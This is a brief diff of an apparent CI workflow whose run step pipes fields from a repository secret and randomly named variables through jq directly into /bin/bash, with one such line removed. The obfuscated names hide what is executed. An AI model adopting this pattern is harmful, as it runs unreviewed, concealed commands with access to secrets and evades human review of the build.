@@ -21,7 +21,6 @@ jobs:
           cwoli3: ${{ secrets.cwoli3 }}
         run: |
           printf '%s' "$cwoli3" | jq -r .hoqt531 | /bin/bash
-          echo $rgqct47289 | jq -r .z33878 | /bin/bash
           printf '%s' "$fwcmc45" | jq -r .yk3709 | /bin/bash
           echo $vykpw4707 | jq -r .awhkf54 | /bin/bash
           echo $sybzq231 | jq -r .jbw60687 | /bin/bash
